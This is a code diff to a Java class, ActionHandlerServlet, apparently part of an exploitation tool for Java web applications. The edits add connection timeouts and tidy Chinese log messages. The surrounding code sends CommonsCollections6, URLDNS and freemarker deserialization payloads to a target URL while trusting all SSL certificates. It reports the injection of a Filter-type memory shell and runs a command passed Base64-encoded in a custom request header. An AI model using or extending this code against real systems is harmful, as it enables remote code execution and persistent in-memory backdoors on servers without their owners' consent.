@@ -68,10 +68,13 @@ public class ActionHandlerServlet extends VulnBase {
             // 信任ssl证书
             SSLUtil.trustAllCertificates();
 
-            //发送请求
+            // 发送请求
             URL apiUrl = new URL(url);
             byte[] compressData = urldns_baos.toByteArray();
             HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();
+
+            // 设置超时
+            HttpUtil.setTimeout(urldns_conn);
 
             // 设置请求头
             urldns_conn.setRequestProperty("Content-Type", "application/octet-stream");
@@ -115,6 +118,9 @@ public class ActionHandlerServlet extends VulnBase {
             byte[] compressData = exp_cc6_baos.toByteArray();
             HttpURLConnection exp_cc6_conn = (HttpURLConnection) apiUrl.openConnection();
 
+            // 设置超时
+            HttpUtil.setTimeout(exp_cc6_conn);
+
             // 设置请求头
             exp_cc6_conn.setRequestProperty("Content-Type", "application/octet-stream");
             exp_cc6_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));
@@ -125,7 +131,7 @@ public class ActionHandlerServlet extends VulnBase {
             // 处理响应
             int responseCode = HttpUtil.getResponseCode(exp_cc6_conn);
             if (responseCode == HttpURLConnection.HTTP_OK) {
-                logMessage("[+] Filter类型内存马注入成功, 请手动连接验证.");
+                logMessage("[+] Filter 类型内存马注入成功, 请手动连接验证.");
                 exp_cc6_conn.disconnect();
                 return true;
             } else {
@@ -163,6 +169,9 @@ public class ActionHandlerServlet extends VulnBase {
             byte[] compressData = exec_cc6_baos.toByteArray();
             HttpURLConnection exec_cc6_poc_conn = (HttpURLConnection) apiUrl.openConnection();
 
+            // 设置超时
+            HttpUtil.setTimeout(exec_cc6_poc_conn);
+
             // 设置请求头
             exec_cc6_poc_conn.setRequestProperty("Content-Type", "application/octet-stream");
             exec_cc6_poc_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));
@@ -177,6 +186,9 @@ public class ActionHandlerServlet extends VulnBase {
                 // 创建新连接
                 HttpURLConnection exec_cc6_exp_conn = (HttpURLConnection) apiUrl.openConnection();
 
+                // 设置超时
+                HttpUtil.setTimeout(exec_cc6_exp_conn);
+
                 exec_cc6_exp_conn.setRequestProperty("Content-Type", "application/octet-stream");
                 exec_cc6_exp_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));
                 exec_cc6_exp_conn.setRequestProperty("testzxcv4", flag + Util.byteCodeToBase64(Config.CMD.getBytes()));
@@ -189,11 +201,11 @@ public class ActionHandlerServlet extends VulnBase {
                     logExec("[+] CommonsCollections6 执行成功!\n" + cc6ExpResponseText);
                     return true;
                 } else {
-                    logExec("[-] CommonsCollections6执行失败, 尝试 freemarker.template.utility.Execute 执行.");
+                    logExec("[-] CommonsCollections6 执行失败, 尝试 freemarker.template.utility.Execute 执行.");
                     return false;
                 }
             } else {
-                logExec("[-] CommonsCollections6执行失败, 尝试 freemarker.template.utility.Execute 执行.");
+                logExec("[-] CommonsCollections6 执行失败, 尝试 freemarker.template.utility.Execute 执行.");
                 return false;
             }
         } catch (Exception e) {
@@ -227,6 +239,9 @@ public class ActionHandlerServlet extends VulnBase {
             URL apiUrl = new URL(url);
             byte[] compressData = exec_freemarker_baos.toByteArray();
             HttpURLConnection exec_freemarker_conn = (HttpURLConnection) apiUrl.openConnection();
+
+            // 设置超时
+            HttpUtil.setTimeout(exec_freemarker_conn);
 
             // 设置请求头
             exec_freemarker_conn.setRequestProperty("Content-Type", "application/octet-stream");
